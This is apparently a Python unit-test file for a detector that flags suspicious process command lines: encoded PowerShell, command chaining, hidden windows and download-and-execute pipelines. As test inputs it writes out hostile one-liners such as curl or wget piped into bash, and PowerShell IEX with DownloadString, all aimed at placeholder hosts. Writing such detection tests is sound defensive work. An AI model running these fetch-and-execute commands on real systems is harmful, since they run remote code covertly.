import unittest

from src.detectors.command_detector import (
    detect_command_indicators,
    normalize_command_line,
    split_command_line,
)


class TestCommandDetector(unittest.TestCase):

    def test_empty_or_none_cmdline(self):
        self.assertEqual(detect_command_indicators(None), [])
        self.assertEqual(detect_command_indicators([]), [])

    def test_benign_cmdline(self):
        cmdline = ["python", "app.py", "--verbose"]
        self.assertEqual(detect_command_indicators(cmdline), [])

    def test_encoded_command_indicators(self):
        test_cases = [
            (["powershell.exe", "-enc", "aW1wb3J0"], ["encoded_command"]),
            (["powershell.exe", "-encodedcommand", "aW1wb3J0"], ["encoded_command"]),
            (["powershell", "[System.Convert]::FromBase64String('abc')"], ["encoded_command"]),
            (["bash", "-c", "echo abc | base64 -d"], ["encoded_command"]),
        ]
        for cmdline, expected in test_cases:
            with self.subTest(cmdline=cmdline):
                indicators = detect_command_indicators(cmdline)
                self.assertIn("encoded_command", indicators)

    def test_command_chaining(self):
        test_cases = [
            (["cmd.exe", "/c", "dir && echo done"], ["command_chaining"]),
            (["sh", "-c", "ls || echo failed"], ["command_chaining"]),
        ]
        for cmdline, expected in test_cases:
            with self.subTest(cmdline=cmdline):
                indicators = detect_command_indicators(cmdline)
                self.assertIn("command_chaining", indicators)

    def test_download_and_execute(self):
        test_cases = [
            (["curl", "http://malicious.com/script.sh", "|", "bash"], ["download_and_execute"]),
            (["wget", "http://malicious.com/payload", "|", "powershell"], ["download_and_execute"]),
        ]
        for cmdline, expected in test_cases:
            with self.subTest(cmdline=cmdline):
                indicators = detect_command_indicators(cmdline)
                self.assertIn("download_and_execute", indicators)

    def test_hidden_execution(self):
        test_cases = [
            (["powershell.exe", "-windowstyle", "hidden", "-c", "Write-Host"], ["hidden_execution"]),
            (["powershell.exe", "-w", "hidden", "-c", "Write-Host"], ["hidden_execution"]),
        ]
        for cmdline, expected in test_cases:
            with self.subTest(cmdline=cmdline):
                indicators = detect_command_indicators(cmdline)
                self.assertIn("hidden_execution", indicators)

    def test_multiple_indicators(self):
        cmdline = ["powershell.exe", "-w", "hidden", "-enc", "aW1wb3J0"]
        indicators = detect_command_indicators(cmdline)
        self.assertIn("encoded_command", indicators)
        self.assertIn("hidden_execution", indicators)

    # ------------------------------------------------------------------
    # Input normalization
    # ------------------------------------------------------------------

    def test_string_command_lines_are_supported(self):
        indicators = detect_command_indicators("powershell.exe -enc aW1wb3J0")
        self.assertIn("encoded_command", indicators)

        indicators = detect_command_indicators("cmd.exe /c dir && echo done")
        self.assertIn("command_chaining", indicators)

    def test_string_command_line_is_not_joined_character_by_character(self):
        # A raw string must never be interpreted as a sequence of characters
        indicators = detect_command_indicators("curl http://example.invalid/x | sh")
        self.assertIn("download_and_execute", indicators)

    def test_normalize_command_line(self):
        self.assertEqual(normalize_command_line(None), [])
        self.assertEqual(normalize_command_line(""), [])
        self.assertEqual(normalize_command_line([]), [])
        self.assertEqual(normalize_command_line("a b"), ["a", "b"])
        self.assertEqual(normalize_command_line(["a", "b"]), ["a", "b"])
        self.assertEqual(normalize_command_line(("a", "b")), ["a", "b"])
        self.assertEqual(normalize_command_line([None, "a"]), ["a"])

    def test_split_command_line_respects_quotes(self):
        tokens = split_command_line('cmd.exe /c "echo hello world"')
        self.assertEqual(tokens[0], "cmd.exe")
        self.assertEqual(tokens[-1], '"echo hello world"')

    def test_missing_command_line_is_not_evidence(self):
        self.assertEqual(detect_command_indicators(None), [])
        self.assertEqual(detect_command_indicators([]), [])
        self.assertEqual(detect_command_indicators(""), [])
        self.assertEqual(detect_command_indicators({}), [])

    # ------------------------------------------------------------------
    # Encoded command switches
    # ------------------------------------------------------------------

    def test_encoded_command_switch_variants(self):
        test_cases = [
            ["powershell.exe", "-enc", "aW1wb3J0"],
            ["powershell.exe", "-e", "aW1wb3J0"],
            ["powershell.exe", "-ec", "aW1wb3J0"],
            ["powershell.exe", "-EncodedCommand", "aW1wb3J0"],
            ["powershell.exe", "-ENCODEDCOMMAND", "aW1wb3J0"],
            ["powershell.exe", "/enc", "aW1wb3J0"],
            ["powershell.exe", "-enco", "aW1wb3J0"],
            ["pwsh.exe", "-enc", "aW1wb3J0"],
        ]
        for cmdline in test_cases:
            with self.subTest(cmdline=cmdline):
                self.assertIn(
                    "encoded_command", detect_command_indicators(cmdline)
                )

    def test_encoded_command_inside_nested_shell_command(self):
        # cmd.exe delivers the nested command as a single argument
        cmdline = ["cmd.exe", "/c", "powershell.exe -enc aW1wb3J0"]
        self.assertIn("encoded_command", detect_command_indicators(cmdline))

    def test_cmd_echo_switch_is_not_an_encoded_command(self):
        # "cmd /e" enables command echoing and is completely benign
        self.assertNotIn(
            "encoded_command", detect_command_indicators(["cmd.exe", "/e", "on"])
        )

    def test_unrelated_switches_are_not_encoded_commands(self):
        benign = [
            ["python.exe", "-m", "http.server", "8080"],
            ["robocopy.exe", "/E", "/R:1", "C:\\src", "C:\\dst"],
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", "C:\\script.ps1"],
        ]
        for cmdline in benign:
            with self.subTest(cmdline=cmdline):
                self.assertNotIn(
                    "encoded_command", detect_command_indicators(cmdline)
                )

    # ------------------------------------------------------------------
    # Hidden window options
    # ------------------------------------------------------------------

    def test_hidden_window_option_variants(self):
        test_cases = [
            ["powershell.exe", "-WindowStyle", "Hidden", "-c", "Write-Host"],
            ["powershell.exe", "-windowstyle", "hidden", "-c", "Write-Host"],
            ["powershell.exe", "-w", "hidden", "-c", "Write-Host"],
            ["powershell.exe", "-W", "Hidden", "-c", "Write-Host"],
            ["powershell.exe", "-w", "1", "-c", "Write-Host"],
            ["powershell.exe", "-WindowStyle:Hidden", "-c", "Write-Host"],
            ["pwsh.exe", "-w", "hidden", "-c", "Write-Host"],
        ]
        for cmdline in test_cases:
            with self.subTest(cmdline=cmdline):
                self.assertIn(
                    "hidden_execution", detect_command_indicators(cmdline)
                )

    def test_unrelated_w_switch_is_not_hidden_execution(self):
        # "/w" on robocopy is a retry wait, not a window style
        self.assertNotIn(
            "hidden_execution",
            detect_command_indicators(["robocopy.exe", "/w", "5", "C:\\a", "C:\\b"]),
        )

    # ------------------------------------------------------------------
    # Chaining
    # ------------------------------------------------------------------

    def test_chaining_operators(self):
        test_cases = [
            ["cmd.exe", "/c", "dir && echo done"],
            ["cmd.exe", "/c", "dir || echo failed"],
            ["cmd.exe", "/c", "dir & echo done"],
            ["sh", "-c", "ls; echo done"],
            ["powershell.exe", "-Command", "Get-Process; Stop-Process"],
            ["bash", "-lc", "echo one && echo two"],
        ]
        for cmdline in test_cases:
            with self.subTest(cmdline=cmdline):
                self.assertIn(
                    "command_chaining", detect_command_indicators(cmdline)
                )

    def test_non_shell_commands_are_not_chaining(self):
        benign = [
            ["python.exe", "app.py", "--name", "a&b"],
            ["notepad.exe", "C:\\notes;draft.txt"],
            ["git.exe", "commit", "-m", "fix & improve"],
        ]
        for cmdline in benign:
            with self.subTest(cmdline=cmdline):
                self.assertNotIn(
                    "command_chaining", detect_command_indicators(cmdline)
                )

    # ------------------------------------------------------------------
    # Download and execute
    # ------------------------------------------------------------------

    def test_powershell_download_and_execute(self):
        test_cases = [
            [
                "powershell.exe",
                "-Command",
                "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')",
            ],
            ["powershell.exe", "-c", "iwr http://example.invalid/a | iex"],
            ["powershell.exe", "-c", "Invoke-WebRequest http://example.invalid/a | Invoke-Expression"],
            ["powershell.exe", "-c", "(New-Object Net.WebClient).DownloadString('http://example.invalid/a')"],
        ]
        for cmdline in test_cases:
            with self.subTest(cmdline=cmdline):
                self.assertIn(
                    "download_and_execute", detect_command_indicators(cmdline)
                )

    def test_dynamic_code_execution_indicator(self):
        indicators = detect_command_indicators(
            ["powershell.exe", "-c", "IEX 'Write-Host hello'"]
        )
        self.assertIn("dynamic_code_execution", indicators)

    def test_plain_download_without_execution_is_not_flagged(self):
        indicators = detect_command_indicators(["curl.exe", "http://example.invalid/a.zip"])
        self.assertNotIn("download_and_execute", indicators)
        self.assertNotIn("dynamic_code_execution", indicators)

    def test_parent_shell_pipeline_is_detected(self):
        # The pipe operator is consumed by the parent shell and therefore
        # never appears in the child command line.
        context = {
            "parent_name": "cmd.exe",
            "parent_cmdline": '"C:\\Windows\\System32\\cmd.exe" /c "curl http://example.invalid/a | sh"',
        }
        indicators = detect_command_indicators(["sh"], context=context)
        self.assertIn("download_and_execute", indicators)

    def test_parent_shell_pipeline_requires_matching_parent(self):
        context = {
            "parent_name": "explorer.exe",
            "parent_cmdline": "curl http://example.invalid/a | sh",
        }
        indicators = detect_command_indicators(["sh"], context=context)
        self.assertNotIn("download_and_execute", indicators)

    # ------------------------------------------------------------------
    # Benign baselines
    # ------------------------------------------------------------------

    def test_benign_command_lines_produce_no_indicators(self):
        benign = [
            ["notepad.exe", "C:\\Users\\test\\notes.txt"],
            ["python.exe", "-m", "pytest", "-q", "tests"],
            ["chrome.exe", "--type=renderer", "--lang=en-US"],
            ["svchost.exe", "-k", "netsvcs"],
            ["git.exe", "status"],
            ["cmd.exe", "/c", "echo hello world"],
        ]
        for cmdline in benign:
            with self.subTest(cmdline=cmdline):
                self.assertEqual(detect_command_indicators(cmdline), [])


if __name__ == "__main__":
    unittest.main()
